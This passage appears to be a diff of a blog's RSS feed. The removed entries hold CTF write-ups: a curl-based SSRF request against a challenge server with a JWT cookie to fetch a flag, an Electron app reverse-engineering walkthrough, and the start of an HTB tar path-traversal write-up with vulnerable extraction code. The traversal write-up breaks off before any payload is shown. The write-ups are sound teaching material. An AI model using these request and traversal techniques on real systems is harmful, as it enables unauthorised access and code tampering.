-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -X POST https://customer-support-p558t.ondigitalocean.app/api/contact -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;ts&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;test@test.com&amp;#34;,&amp;#34;subject&amp;#34;:&amp;#34;test&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;http://::1/28/auth&amp;#34;}&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png&#34; alt=&#34;&#34;&gt;
-This will return a token.&lt;/p&gt;
-&lt;p&gt;What can we do with the token?
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png&#34; alt=&#34;&#34;&gt;
-there&amp;rsquo;s an api that will take the token and return the flag.
-We need to pass the token in cookie Authorization.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl --cookie &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE&amp;#39;&lt;/span&gt; https://customer-support-p558t.ondigitalocean.app/api/auth
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png&#34; alt=&#34;&#34;&gt;
-This gives me the flag&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5}
-&lt;/code&gt;&lt;/pre&gt;</description>
+      <guid>http://localhost:1313/posts/writeups/umdctf/customersupport/</guid>
+      <description>For this challenge we were given So I stared out by opening the Dockerfile In the docker file we can see the starting command is npm run startall Looking at the package.json we can see two service being started with start all script.
+In app.js inside microservice we can see two path that returns token. This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn&amp;rsquo;t access it.</description>
     </item>
-    
     <item>
       <title>Hacking Electron App - Web Inspection - MetaCTF</title>
-      <link>https://drMoscovium.dev/posts/writeups/metactf/web-inspection/</link>
+      <link>http://localhost:1313/posts/writeups/metactf/web-inspection/</link>
       <pubDate>Mon, 06 Dec 2021 14:45:23 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/metactf/web-inspection/</guid>
-      <description>&lt;p&gt;&lt;strong&gt;Challenge Descrption:&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;We&amp;rsquo;ve deployed a fairly simple program that can take input and display its hash in a number of different formats. It&amp;rsquo;s available on both Windows and Linux.&lt;/p&gt;
-&lt;p&gt;Get down in the weeds and see if you can understand how it works. You may want go beyond static analysis on this one. Try connecting it to a debugger (using default debugger settings!) and watch what requests it makes - I bet there&amp;rsquo;ll be a flag waiting.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Web Exploitation&lt;/strong&gt; 375&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;Web Inspection was a challenge where we had to basically reverse engineer the code. The challenge description wanted us to hook it up to a debugger and that should give us the flag.&lt;/p&gt;
-&lt;h1 id=&#34;analyzing&#34;&gt;Analyzing&lt;/h1&gt;
-&lt;p&gt;Below is the tree of the source provided.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;├── blink_image_resources_200_percent.pak
-├── content_resources_200_percent.pak
-├── content_shell.pak
-├── icudtl.dat
-├── libffmpeg.so
-├── libnode.so
-├── LICENSE
-├── LICENSES.chromium.html
-├── meta-quick-hash
-├── natives_blob.bin
-├── resources
-│   ├── app.asar
-│   └── electron.asar
-├── ui_resources_200_percent.pak
-├── v8_context_snapshot.bin
-├── version
-└── views_resources_200_percent.pak
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I started out by running the &lt;code&gt;meta-quick-hash&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/webinspection/first.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;It looks like it just returns hashes of the input provided. They said that it was an electron app, so I tried to open &lt;code&gt;Chromium Dev&lt;/code&gt; tools. It didn&amp;rsquo;t work.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/09Lfmqt2FGAAAAAC/where-is-it-frantic.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I tried bunch of stuffs, nothing happened.&lt;/p&gt;
-&lt;p&gt;I tried to open it up with electron inspector by using the command&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect=5858 meta-quick-hash
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I got bunch of errors and nothing more&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/webinspection/second.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;There&amp;rsquo;s nothing we can get out of the app, let&amp;rsquo;s look at what else we have.&lt;/p&gt;
-&lt;h3 id=&#34;resources&#34;&gt;Resources&lt;/h3&gt;
-&lt;p&gt;There are two files inside &lt;code&gt;resources&lt;/code&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;resources
-├── app.asar
-└── electron.asar
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After opening up &lt;code&gt;app.asar&lt;/code&gt;, I found out that it has all the source file contained in it.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;#34;files&amp;#34;:{&amp;#34;app.js&amp;#34;:{&amp;#34;size&amp;#34;:1961,&amp;#34;offset&amp;#34;:&amp;#34;0&amp;#34;},&amp;#34;index.html&amp;#34;:{&amp;#34;size&amp;#34;:1774,&amp;#34;offset&amp;#34;:&amp;#34;1961&amp;#34;},&amp;#34;LICENSE&amp;#34;:{&amp;#34;size&amp;#34;:1065,&amp;#34;offset&amp;#34;:&amp;#34;3735&amp;#34;},&amp;#34;node_modules&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;@bitdisaster&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;@electron&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;@malept&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;@sindresorhus&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;@szmarczak&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;@types&amp;#34;:{&amp;#34;files&amp;#34;:{}},&amp;#34;electron-log&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;LICENSE&amp;#34;:{&amp;#34;size&amp;#34;:1082,&amp;#34;offset&amp;#34;:&amp;#34;4800&amp;#34;},&amp;#34;package.json&amp;#34;:{&amp;#34;size&amp;#34;:2260,&amp;#34;offset&amp;#34;:&amp;#34;5882&amp;#34;},&amp;#34;README.md&amp;#34;:{&amp;#34;size&amp;#34;:5464,&amp;#34;offset&amp;#34;:&amp;#34;8142&amp;#34;},&amp;#34;src&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;__specs__&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;catchErrors.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:1047,&amp;#34;offset&amp;#34;:&amp;#34;13606&amp;#34;},&amp;#34;index.d.test.ts&amp;#34;:{&amp;#34;size&amp;#34;:285,&amp;#34;offset&amp;#34;:&amp;#34;14653&amp;#34;},&amp;#34;index.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:1068,&amp;#34;offset&amp;#34;:&amp;#34;14938&amp;#34;},&amp;#34;log.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:3272,&amp;#34;offset&amp;#34;:&amp;#34;16006&amp;#34;},&amp;#34;scope.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:1462,&amp;#34;offset&amp;#34;:&amp;#34;19278&amp;#34;},&amp;#34;utils&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;fsHelpers.js&amp;#34;:{&amp;#34;size&amp;#34;:552,&amp;#34;offset&amp;#34;:&amp;#34;20740&amp;#34;},&amp;#34;TestLogReader.js&amp;#34;:{&amp;#34;size&amp;#34;:2589,&amp;#34;offset&amp;#34;:&amp;#34;21292&amp;#34;}}}}},&amp;#34;catchErrors.js&amp;#34;:{&amp;#34;size&amp;#34;:2405,&amp;#34;offset&amp;#34;:&amp;#34;23881&amp;#34;},&amp;#34;electronApi.js&amp;#34;:{&amp;#34;size&amp;#34;:4807,&amp;#34;offset&amp;#34;:&amp;#34;26286&amp;#34;},&amp;#34;index.d.ts&amp;#34;:{&amp;#34;size&amp;#34;:10549,&amp;#34;offset&amp;#34;:&amp;#34;31093&amp;#34;},&amp;#34;index.js&amp;#34;:{&amp;#34;size&amp;#34;:2212,&amp;#34;offset&amp;#34;:&amp;#34;41642&amp;#34;},&amp;#34;log.js&amp;#34;:{&amp;#34;size&amp;#34;:1576,&amp;#34;offset&amp;#34;:&amp;#34;43854&amp;#34;},&amp;#34;scope.js&amp;#34;:{&amp;#34;size&amp;#34;:1302,&amp;#34;offset&amp;#34;:&amp;#34;45430&amp;#34;},&amp;#34;transform&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;__specs__&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;index.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:951,&amp;#34;offset&amp;#34;:&amp;#34;46732&amp;#34;},&amp;#34;object.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:1645,&amp;#34;offset&amp;#34;:&amp;#34;47683&amp;#34;},&amp;#34;style.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:1111,&amp;#34;offset&amp;#34;:&amp;#34;49328&amp;#34;},&amp;#34;template.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:2992,&amp;#34;offset&amp;#34;:&amp;#34;50439&amp;#34;}}},&amp;#34;index.js&amp;#34;:{&amp;#34;size&amp;#34;:1544,&amp;#34;offset&amp;#34;:&amp;#34;53431&amp;#34;},&amp;#34;object.js&amp;#34;:{&amp;#34;size&amp;#34;:2781,&amp;#34;offset&amp;#34;:&amp;#34;54975&amp;#34;},&amp;#34;style.js&amp;#34;:{&amp;#34;size&amp;#34;:1600,&amp;#34;offset&amp;#34;:&amp;#34;57756&amp;#34;},&amp;#34;template.js&amp;#34;:{&amp;#34;size&amp;#34;:3998,&amp;#34;offset&amp;#34;:&amp;#34;59356&amp;#34;}}},&amp;#34;transports&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;__specs__&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;console.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:5347,&amp;#34;offset&amp;#34;:&amp;#34;63354&amp;#34;}}},&amp;#34;console.js&amp;#34;:{&amp;#34;size&amp;#34;:3034,&amp;#34;offset&amp;#34;:&amp;#34;68701&amp;#34;},&amp;#34;file&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;__specs__&amp;#34;:{&amp;#34;files&amp;#34;:{&amp;#34;file.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:5129,&amp;#34;offset&amp;#34;:&amp;#34;71735&amp;#34;},&amp;#34;index.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:4660,&amp;#34;offset&amp;#34;:&amp;#34;76864&amp;#34;},&amp;#34;makeTmpDir.js&amp;#34;:{&amp;#34;size&amp;#34;:546,&amp;#34;offset&amp;#34;:&amp;#34;81524&amp;#34;},&amp;#34;packageJson.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:871,&amp;#34;offset&amp;#34;:&amp;#34;82070&amp;#34;},&amp;#34;variables.spec.js&amp;#34;:{&amp;#34;size&amp;#34;:4530,&amp;#34;offset&amp;#34;:&amp;#34;82941&amp;#34;}}},&amp;#34;file.js&amp;#34;:{&amp;#34;size&amp;#34;:6994,&amp;#34;offset&amp;#34;:&amp;#34;87471&amp;#34;},&amp;#34;index.js&amp;#34;:{&amp;#34;size&amp;#34;:5079,&amp;#34;offset&amp;#34;:&amp;#34;94465&amp;#34;},&amp;#34;packageJson.js&amp;#34;:{&amp;#34;size&amp;#34;:1713,&amp;#34;offset&amp;#34;:&amp;#34;99544&amp;#34;},&amp;#34;variables.js&amp;#34;:{&amp;#34;size&amp;#34;:2687,&amp;#34;offset&amp;#34;:&amp;#34;101257&amp;#34;}}},&amp;#34;ipc.js&amp;#34;:{&amp;#34;size&amp;#34;:1098,&amp;#34;offset&amp;#34;:&amp;#34;103944&amp;#34;},&amp;#34;remote.js&amp;#34;:{&amp;#34;size&amp;#34;:2172,&amp;#34;offset&amp;#34;:&amp;#34;105042&amp;#34;}}}}}}}}},&amp;#34;package.json&amp;#34;:{&amp;#34;size&amp;#34;:431,&amp;#34;offset&amp;#34;:&amp;#34;107214&amp;#34;},&amp;#34;README.md&amp;#34;:{&amp;#34;size&amp;#34;:773,&amp;#34;offset&amp;#34;:&amp;#34;107645&amp;#34;},&amp;#34;styles.css&amp;#34;:{&amp;#34;size&amp;#34;:261,&amp;#34;offset&amp;#34;:&amp;#34;108418&amp;#34;},&amp;#34;window.js&amp;#34;:{&amp;#34;size&amp;#34;:650,&amp;#34;offset&amp;#34;:&amp;#34;108679&amp;#34;}}}�const https = require(&amp;#39;https&amp;#39;)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The information about where the file starts and where it ends is stored on the first line of the file.&lt;/p&gt;
-&lt;p&gt;Next thing I tried was&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect=5858 app.asar
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this I was able to open up the &lt;code&gt;Chromium dev-tools&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/webinspection/fourth.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;There were errors in the code.
-Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work. If I wanted to change anything in the app.asar source, I would have to go to the top of the file and change the offset and the size.&lt;/p&gt;
-&lt;p&gt;After doing some research on asar I found out that:&lt;/p&gt;
-&lt;p&gt;Asar is a simple extensive archive format, according to this Github read me &lt;a href=&#34;https://github.com/electron/asar&#34;&gt;https://github.com/electron/asar&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;extracting-the-source-code&#34;&gt;Extracting the source code&lt;/h1&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;asar extract app.asar source
-&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;source
-├── app.js
-├── index.html
-├── LICENSE
-├── package.json
-├── README.md
-├── styles.css
-└── window.js
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It extracted the original source code.
-&lt;img src=&#34;https://c.tenor.com/1KA_cOIDsf0AAAAC/what-am-i-supposed-to-do-token-black.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;My instinct was to run &lt;code&gt;npm start&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;It worked but it gave me the same error as when I ran it with electron.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  &amp;lt;script&amp;gt;
-    delete module.exports
-  &amp;lt;/scrip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There was this code inside the index.html. I went ahead and removed it.&lt;/p&gt;
-&lt;p&gt;It got rid of one of the error.&lt;/p&gt;
-&lt;p&gt;There were jquery errors, so I changed the CDN to import the latest version of jQuery.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script src=&amp;#34;https://code.jquery.com/jquery-3.6.0.js&amp;#34; integrity=&amp;#34;sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These got rid of the errors.&lt;/p&gt;
-&lt;p&gt;Now I tried to open the app.js with electron inspect&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/webinspection/third.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Got some errors.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/fvqEfiBtv3oAAAAd/this-isnt-how-its-supposed-to-happen-randy-marsh.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Looking inside the app.js I found this GET request.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  window.once(&amp;#39;ready-to-show&amp;#39;, () =&amp;gt; {
-    window.show();
-        
-    var inspect_bool = inspector.url();
-    if(inspect_bool) {
-	    const options = {
-		hostname: &amp;#39;metaproblems.com&amp;#39;,
-		port: 443,
-		path: &amp;#39;/858cdff94bcf63e59aafeebebb7bc304/&amp;#39; + xorStrings(decodeURIComponent(escape(Buffer.from(&amp;#39;EksCGkoJVlMZBEwIFlMJX1YGWB5VDkcMGB1UXA==&amp;#39;, &amp;#39;base64&amp;#39;).toString())),inspect_bool.substring(0,20) + window.webContents.history[0].split(&amp;#34;&amp;#34;).reverse().join(&amp;#34;&amp;#34;).substring(0,8)) + &amp;#39;.html&amp;#39;,
-		method: &amp;#39;GET&amp;#39;
-	    };
-	    const req = https.request(options, res =&amp;gt; { res.on(&amp;#39;data&amp;#39;, d =&amp;gt; {})}); 
-	    req.end(); 
-    }
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It sends get request only when the &lt;code&gt;inspector_bool is not undefined&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;As a regular programmer, I did what I was supposed to do.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;console.log(&amp;quot;I am here&amp;quot;)&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;So the if statement isn&amp;rsquo;t working. Time to print the inspector.url();&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Inspector.url&lt;/code&gt; only works when we run the app in debug mode.&lt;/p&gt;
-&lt;p&gt;I think all we have to do now is print the data from the get request.&lt;/p&gt;
-&lt;p&gt;It&amp;rsquo;s not so simple.&lt;/p&gt;
-&lt;p&gt;Playing around with the code a little bit, I found out that &lt;code&gt;window.webContents.history[0]&lt;/code&gt; returns &lt;code&gt;undefined.&lt;/code&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  window.loadURL(url.format({
-    pathname: path.join(__dirname, &amp;#39;index.html&amp;#39;),
-    protocol: &amp;#39;file:&amp;#39;,
-    slashes: true
-  }))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the code that is supposed to add something to the history.&lt;/p&gt;
-&lt;p&gt;I found two ways to solve this problem.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Do the debugging stuffs from VS code that will execute the loadURL&lt;/li&gt;
-&lt;li&gt;Out smart them by replacing the history thing&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;I went with option 2, just cause it seemed like something that the creator don&amp;rsquo;t want us to do.&lt;/p&gt;
-&lt;p&gt;So the loadURL is loading the directory path, for this challenge to work they can&amp;rsquo;t expect everyone to have same local directory structure. They will have to use a constant. Which is the index.html&lt;/p&gt;
-&lt;p&gt;Looking at the &lt;code&gt;window.webContents.history[0].split(&amp;quot;&amp;quot;).reverse().join(&amp;quot;&amp;quot;).substring(0,8))&lt;/code&gt;. We can see that it only takes the last 8 characters of the file path. Which is dex.html&lt;/p&gt;
-&lt;p&gt;So I reversed the dex.html which is &lt;code&gt;lmth.xed&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Then I replaced the it in the code.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  window.once(&amp;#39;ready-to-show&amp;#39;, () =&amp;gt; {
-    window.show();
-    var inspect_bool = inspector.url();
-    if(inspect_bool) {
-        console.log(&amp;#34;I am here&amp;#34;);
-	    const options = {
-		hostname: &amp;#39;metaproblems.com&amp;#39;,
-		port: 443,
-        path: &amp;#39;/858cdff94bcf63e59aafeebebb7bc304/&amp;#39; + xorStrings(decodeURIComponent(escape(Buffer.from(&amp;#39;EksCGkoJVlMZBEwIFlMJX1YGWB5VDkcMGB1UXA==&amp;#39;, &amp;#39;base64&amp;#39;).toString())),inspect_bool.substring(0,20) + &amp;#39;lmth.xed&amp;#39;) + &amp;#39;.html&amp;#39;,
-		// path: &amp;#39;/858cdff94bcf63e59aafeebebb7bc304/&amp;#39; + xorStrings(decodeURIComponent(escape(Buffer.from(&amp;#39;EksCGkoJVlMZBEwIFlMJX1YGWB5VDkcMGB1UXA==&amp;#39;, &amp;#39;base64&amp;#39;).toString())),inspect_bool.substring(0,20) + window.webContents.history[0].split(&amp;#34;&amp;#34;).reverse().join(&amp;#34;&amp;#34;).substring(0,8)) + &amp;#39;.html&amp;#39;,
-		method: &amp;#39;GET&amp;#39;
-	    };
-        var str = &amp;#34;&amp;#34;
-	    const req = https.request(options, res =&amp;gt; { res.on(&amp;#39;data&amp;#39;, d =&amp;gt; { console.log(str+=d)})}); 
-	    req.end(); 
-        console.log(str);
-    }
-  })
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here my new code&lt;/p&gt;
-&lt;p&gt;Finally running&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect app.js
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gives the following output&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/webinspection/tty.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;MetaCTF{aint_no_javascript_ever_gonna_stop_a_hacker}
-&lt;/code&gt;&lt;/pre&gt;</description>
+      <guid>http://localhost:1313/posts/writeups/metactf/web-inspection/</guid>
+      <description>Challenge Descrption:
+We&amp;rsquo;ve deployed a fairly simple program that can take input and display its hash in a number of different formats. It&amp;rsquo;s available on both Windows and Linux.
+Get down in the weeds and see if you can understand how it works. You may want go beyond static analysis on this one. Try connecting it to a debugger (using default debugger settings!) and watch what requests it makes - I bet there&amp;rsquo;ll be a flag waiting.</description>
     </item>
-    
     <item>
       <title>HTB UNI CTF : Web Slippy</title>
-      <link>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/web-slippy/</link>
+      <link>http://localhost:1313/posts/writeups/htb-uni-ctf/web-slippy/</link>
       <pubDate>Mon, 22 Nov 2021 15:16:32 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/web-slippy/</guid>
-      <description>&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/web_slippy/ChallengeDescription.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;analyze&#34;&gt;Analyze&lt;/h2&gt;
-&lt;p&gt;For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/web_slippy/Website.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The directory tree of the source code as follow.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./challenge
-├── application
-│   ├── blueprints
-│   │   └── routes.py
-│   ├── config.py
-│   ├── main.py
-│   ├── static
-│   │   ├── archives
-│   │   ├── css
-│   │   │   ├── bootstrap.min.css
-│   │   │   └── main.css
-│   │   ├── images
-│   │   │   ├── card-body2.png
-│   │   │   ├── card-btm2.png
-│   │   │   ├── card-top2.png
-│   │   │   └── upload-doc.png
-│   │   └── js
-│   │       ├── bootstrap.min.js
-│   │       ├── jquery-3.6.0.min.js
-│   │       ├── main.js
-│   │       └── TweenMax.min.js
-│   ├── templates
-│   │   └── index.html
-│   └── util.py
-├── flag
-└── run.py
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can see that the flag file is in the same directory as the run.py&lt;/p&gt;
-&lt;p&gt;So I am assuming that we have to figure out a way to read the flag file.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Util.py&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import functools, tarfile, tempfile, os
-from application import main
-
-generate = lambda x: os.urandom(x).hex()
-
-def extract_from_archive(file):
-    tmp  = tempfile.gettempdir()
-    path = os.path.join(tmp, file.filename)
-    file.save(path)
-
-    if tarfile.is_tarfile(path):
-        tar = tarfile.open(path, &amp;#39;r:gz&amp;#39;)
-        tar.extractall(tmp)
-
-        extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
-        os.makedirs(extractdir, exist_ok=True)
-
-        extracted_filenames = []
-
-        for tarinfo in tar:
-            name = tarinfo.name
-            if tarinfo.isreg():
-                filename = f&amp;#39;{extractdir}/{name}&amp;#39;
-                os.rename(os.path.join(tmp, name), filename)
-                extracted_filenames.append(filename)
-                continue
-
-            os.makedirs(f&amp;#39;{extractdir}/{name}&amp;#39;, exist_ok=True)
-
-        tar.close()
-        return extracted_filenames
-
-    return False
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the code that is used to extract the given tar file.&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s examine this code a bit further.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;generate = lambda x: os.urandom(x).hex()
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is used to generate a random number of the length x. Another way of writing this would be.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def generate(x):
-	return os.urandom(x).hex()
-&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;		extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
-        os.makedirs(extractdir, exist_ok=True)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So here they use the generate to create a new folder to avoid files to collide when they have same name.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  application git:(main) ✗ cat config.py
-
-from application.util import generate
-from os.path import abspath
-
-class Config(object):
-    SECRET_KEY = generate(50)
-    UPLOAD_FOLDER = &amp;#39;/app/application/static/archives&amp;#39;
-
-class ProductionConfig(Config):
-    pass
-
-class DevelopmentConfig(Config):
-    DEBUG = True
-
-class TestingConfig(Config):
-    TESTING = True
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can see that the tar file gets extracted at path &lt;code&gt;/app/application/static/archives/{somerandom}/&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;We also know that the flag is at &lt;code&gt;/app/&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;recon&#34;&gt;Recon&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=263261&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=263261&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;By searching up on the internet, I found this cool bug in the tar file library in python.&lt;/p&gt;
-&lt;p&gt;After reading this for the first time, I thought I could use the &lt;code&gt;../../../flag&lt;/code&gt; as my file name and the download the flag. Seems pretty simple right?&lt;/p&gt;
-&lt;p&gt;Well Not really.&lt;/p&gt;
-&lt;p&gt;The &lt;code&gt;os.rename()&lt;/code&gt; overrides the existing file in the directory.&lt;/p&gt;
-&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
-&lt;p&gt;For the exploit, I thought of overriding the &lt;code&gt;main.py&lt;/code&gt; file and adding a API endpoint that opens the flag and returns it.&lt;/p&gt;
